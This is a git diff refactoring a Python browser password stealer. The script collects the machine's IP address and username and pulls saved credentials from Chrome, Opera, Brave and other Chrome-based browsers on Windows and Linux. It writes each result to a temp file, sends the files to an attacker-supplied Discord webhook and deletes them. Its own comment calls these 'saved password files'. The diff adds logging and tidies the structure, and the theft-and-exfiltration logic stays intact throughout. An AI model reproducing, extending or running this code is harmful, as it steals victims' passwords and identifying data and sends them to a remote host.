@@ -1,4 +1,5 @@
 import getpass
+import logging
 import os
 import platform
 import sys
@@ -9,16 +10,17 @@ from discord_webhook import DiscordWebhook
 from requests import get
 
 import chrome_based
+import logger
 from exceptions import Exit
-from logger import logger
 
-TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(getpass.getuser()) if os.name == "nt" else f"/tmp"
+# Get the temp path for every system
+TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
+    getpass.getuser()) if os.name == "nt" else f"/tmp"
 
 # Print warning
 os.system("cls" if os.name == "nt" else "clear")
-init_message = open("init_message.txt")
-print(init_message.read())
-init_message.close()
+with open("init_message.txt", "r") as file:
+    print(file.read() + '\n')
 
 # Ask for basic info
 discord_webhook_url = input("[~] Enter your Discord Webhook URL >> ")
@@ -33,54 +35,62 @@ def main():
     hook = DiscordWebhook(
         url=discord_webhook_url,
         content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
-        username="0x88")
+        username="Auax"
+    )
 
-    for browser_name in ["chrome", "opera", "brave"]:
+    # Iterate through the handled browsers
+    for browser_name in chrome_based.handled_browsers:
+        print(f"- {browser_name.capitalize()}")
+        logging.info(browser_name.capitalize())
+
         try:
             filename = join(TEMP_PATH, f"{browser_name}.txt")
-
             if platform.system() == "Windows":
-                win = chrome_based.windows.ChromeWindows(browser_name)
+                win = chrome_based.ChromeWindows(browser_name)
+                logging.info("Getting database paths and keys for Windows...")
                 win.get_windows()
+                logging.info("Fetching database values...")
                 win.retrieve_database()
                 win.save(filename)
+                logging.info(f"File saved to: {filename}")
 
             elif platform.system() == "Linux":
-                lin = chrome_based.linux.ChromeLinux(browser_name)
+                lin = chrome_based.ChromeLinux(browser_name)
+                logging.info("Getting database paths and keys for Linux...")
                 lin.get_linux()
+                logging.info("Fetching database values...")
                 lin.retrieve_database()
                 lin.save(filename)
+                logging.info(f"File saved to: {filename}")
 
             else:
-                # macOS not handled yet!
-                logger.error("macOS is not handled!")
+                print("MacOS is not supported")
+                logging.error("MacOS is not supported!")
                 raise Exit(Exit.OS_NOT_SUPPORTED)
 
         except Exception as E:
-            print(f"\nSkipping {browser_name.capitalize()}. Error code: {E}\n")
+            print(f"\nSkipping {browser_name.capitalize()}\n")
+            logging.warning(f"\nSkipping {browser_name.capitalize()}")
+            logging.error(E)
             continue
 
-        try:
-            # Read saved password files to send them through a hook.
-            file = open(filename, "rb")
+        # Read saved password files to send them through a hook.
+        with open(filename, "rb") as file:
             hook.add_file(file=file.read(), filename=filename)
-            file.close()
 
-            print(f"- {browser_name.capitalize()}")
-
-            try:
-                os.remove(filename)  # Delete temp files
-            except OSError:
-                pass
-
-        except Exception as E:
-            raise E
+        try:
+            logging.info(f"Removing {filename}...")
+            os.remove(filename)  # Delete temp files
+        except OSError:
+            logging.warning(f"Couldn't remove {filename}")
+            pass
 
     try:
         hook.execute()  # Send webhook
+
     except requests.exceptions.MissingSchema:
-        logger.error("Invalid Discord Hook URL")
-        print("\nInvalid Discord Hook URL -- Exiting...")
+        logging.error("Invalid Discord Hook URL")
+        print("\nInvalid Discord Hook URL. Exiting...")
         sys.exit(Exit.INVALID_HOOK_URL)
 
 
